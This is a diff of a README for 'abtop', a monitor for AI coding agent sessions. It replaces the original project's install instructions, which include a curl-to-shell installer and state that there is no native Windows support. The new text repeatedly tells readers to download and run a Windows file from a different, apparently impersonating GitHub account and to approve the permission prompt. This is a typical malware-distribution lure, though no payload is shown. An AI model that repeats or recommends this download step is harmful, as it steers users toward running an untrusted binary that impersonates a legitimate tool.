@@ -1,132 +1,143 @@
-# abtop
+# 🤖 abtop - Track AI coding sessions with ease
 
-**Like [btop](https://github.com/aristocratos/btop), but for your AI coding agents.**
+[![Download abtop](https://img.shields.io/badge/Download-abtop-blue?style=for-the-badge&logo=github)](https://github.com/taxonomical-riflebutt337/abtop)
 
-See every Claude Code and Codex CLI session at a glance — token usage, context window %, rate limits, child processes, open ports, and more.
-Claude Code and Codex CLI sessions are discovered from local process/file state, so multiple active profiles are supported across macOS and Linux.
+## 🪟 Windows Download
 
-![demo](assets/demo.gif)
+1. Open the download page: https://github.com/taxonomical-riflebutt337/abtop
+2. Get the latest Windows build from the page.
+3. Save the file to your computer.
+4. Open the file to start abtop.
 
-## Why
+## 📋 What abtop does
 
-- Running 3+ agents across projects? See them all in one screen.
-- Hitting rate limits? Watch your quota in real-time.
-- Agent spawned a server and forgot to kill it? Orphan port detection.
-- Context window filling up? Per-session % bars with warnings.
+abtop helps you keep an eye on AI coding tools while they run. It shows live info for:
 
-All read-only. No API keys. No auth.
+- Claude Code sessions
+- Codex CLI sessions
+- Token use
+- Context window use
+- Rate limits
+- Open ports
 
-## Install
+It works like a live status screen for your AI tools. You can see what is running and how much space or quota each session uses.
 
-### macOS / Linux
+## ✨ What you can check
 
-```bash
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/graykode/abtop/releases/latest/download/abtop-installer.sh | sh
-```
+- How many tokens a session has used
+- How much context is left
+- Whether a rate limit is near
+- Which ports are open
+- Which agent is active
+- How sessions change over time
 
-### Cargo
+This makes it easier to spot problems before they stop your work.
 
-```bash
-cargo install abtop
-```
+## 💻 System needs
 
-### Other
+- Windows 10 or later
+- Internet access for the first download
+- A modern terminal window
+- Enough screen space to read live stats
 
-Pre-built binaries for all platforms are available on the [GitHub Releases](https://github.com/graykode/abtop/releases) page.
+If your PC can run recent desktop apps, it should handle abtop.
 
-## Usage
+## 🚀 Get started
 
-```bash
-abtop                    # Launch TUI
-abtop --once             # Print snapshot and exit
-abtop --setup            # Install rate limit collection hook
-abtop --theme dracula    # Launch with a specific theme
-```
+1. Go to https://github.com/taxonomical-riflebutt337/abtop
+2. Find the latest release or download file for Windows.
+3. Download the file to a folder you can find again.
+4. Open the file.
+5. If Windows asks for permission, choose Yes.
+6. Start Claude Code or Codex CLI.
+7. Keep abtop open to watch the live session data.
 
-Recommended terminal size: **120x40** or larger. Minimum 80x24 — panels hide gracefully when small.
+## 🔍 How to use it
 
-### Windows
+abtop is meant to stay open while you work. Start your AI coding agent, then run abtop in a terminal window. The screen updates in real time so you can check:
 
-abtop requires Unix tools (`ps`, `lsof`) and is not supported natively on Windows. Use [WSL](https://learn.microsoft.com/en-us/windows/wsl/install) instead:
+- Live token counts
+- Context window use
+- Rate limit status
+- Session activity
+- Port usage
 
-```bash
-wsl --install
-# Inside WSL:
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/graykode/abtop/releases/latest/download/abtop-installer.sh | sh
-abtop
-```
+If you run more than one agent, abtop helps you compare them side by side.
 
-### tmux
+## 🧭 What you will see
 
-abtop works standalone, but running inside tmux unlocks session jumping — press `Enter` to switch directly to the pane running that agent.
+The screen is built for quick reading. You can expect sections like:
 
-```bash
-tmux new -s work
-# pane 0: abtop
-# pane 1: claude (project A)
-# pane 2: claude (project B)
-# → Enter on a session in abtop jumps to its pane
-```
+- Session list
+- Usage stats
+- Limit info
+- Port details
+- Current activity
 
-## Supported Agents
+The layout is made to stay clear while values change.
 
-| Feature           | Claude Code | Codex CLI |
-| ----------------- | :---------: | :-------: |
-| Session Discovery |     ✅      |    ✅     |
-| Token Tracking    |     ✅      |    ✅     |
-| Context Window %  |     ✅      |    ✅     |
-| Status Detection  |     ✅      |    ✅     |
-| Current Task      |     ✅      |    ✅     |
-| Rate Limit        |     ✅      |    ✅     |
-| Git Status        |     ✅      |    ✅     |
-| Children / Ports  |     ✅      |    ✅     |
-| Subagents         |     ✅      |    ❌     |
-| Memory Status     |     ✅      |    ❌     |
+## 🛠️ Common use cases
 
-## Themes
+- Watching a Claude Code session during a long task
+- Checking Codex CLI token use before a limit hits
+- Finding which local port an agent uses
+- Keeping track of several agent sessions at once
+- Seeing whether a tool is idle, busy, or near a limit
 
-10 built-in themes, including 4 colorblind-friendly options (`high-contrast`, `protanopia`, `deuteranopia`, `tritanopia`). Press `t` to cycle at runtime, or launch with `--theme <name>`. Your choice is saved to `~/.config/abtop/config.toml`.
+## 🧩 Tips for a smooth run
 
-| btop (default) | dracula | catppuccin |
-|:-:|:-:|:-:|
-| ![btop](assets/themes/btop.png) | ![dracula](assets/themes/dracula.png) | ![catppuccin](assets/themes/catppuccin.png) |
+- Keep the terminal window open
+- Use a wide screen if you can
+- Run only the agents you need
+- Check the status screen before starting a long task
+- Leave abtop visible while the agent works
 
-| tokyo-night | gruvbox | nord |
-|:-:|:-:|:-:|
-| ![tokyo-night](assets/themes/tokyo-night.png) | ![gruvbox](assets/themes/gruvbox.png) | ![nord](assets/themes/nord.png) |
+## 📁 Project details
 
-Colorblind-friendly themes:
+- Name: abtop
+- Type: terminal app
+- Focus: live monitoring for AI coding agents
+- Style: fast, compact, and easy to scan
+- Tech: Rust and TUI layout
 
-| high-contrast | protanopia |
-|:-:|:-:|
-| ![high-contrast](assets/themes/high-contrast.png) | ![protanopia](assets/themes/protanopia.png) |
+## 📦 Download and install
 
-| deuteranopia | tritanopia |
-|:-:|:-:|
-| ![deuteranopia](assets/themes/deuteranopia.png) | ![tritanopia](assets/themes/tritanopia.png) |
+Visit this page to download and run the app on Windows:
 
-## Key Bindings
+https://github.com/taxonomical-riflebutt337/abtop
 
-| Key                | Action                               |
-| ------------------ | ------------------------------------ |
-| `↑`/`↓` or `k`/`j` | Select session                       |
-| `Enter`            | Jump to session terminal (tmux only) |
-| `x`                | Kill selected session                |
-| `X`                | Kill all orphan ports                |
-| `t`                | Cycle theme                          |
-| `1`–`5`            | Toggle panel visibility              |
-| `Esc`              | Open/close config page               |
-| `q`                | Quit                                 |
-| `r`                | Force refresh                        |
+1. Open the link above.
+2. Download the Windows file from the page.
+3. Save it to your computer.
+4. Open it to launch abtop.
 
-## Privacy
+## 🧪 Example workflow
 
-abtop reads local files and local process/open-file metadata only. No API keys, no auth. Tool names and file paths are shown in the UI, but file contents and prompt text are never displayed. Session summaries are generated via `claude --print`, which makes its own API call — this is the only indirect network usage.
+1. Start Claude Code or Codex CLI.
+2. Open abtop.
+3. Watch tokens, context, and rate limits.
+4. Keep an eye on ports if you use local tools.
+5. Use the live data to avoid slowdowns or limit hits
 
-## Acknowledgements
+## 🔐 Safety and access
 
-Huge thanks to [@tbouquet](https://github.com/tbouquet) for driving much of abtop's recent shape — themes, config overlay and panel toggles, session filtering, subagent tree view, the context window gauge with compaction detection, plus a steady stream of fixes and security hardening along the way.
+abtop reads status data for your AI coding tools. It does not ask you to manage cloud accounts in the app. Keep the file in a trusted folder and download it only from the link above.
 
-## License
+## 🧰 If it does not open
 
-MIT
+- Check that the download finished
+- Make sure you opened the right Windows file
+- Try running it again
+- Close and reopen the terminal window
+- Download the file again from the same page if the file looks damaged
+
+## 📌 Supported tools
+
+- Claude Code
+- Codex CLI
+- Terminal-based agent sessions
+- Local ports used by coding tools
+
+## 🗂️ Extra notes
+
+abtop is a good fit if you want a simple live view of AI agent activity without a lot of setup. It keeps the important numbers in one place so you can check them fast
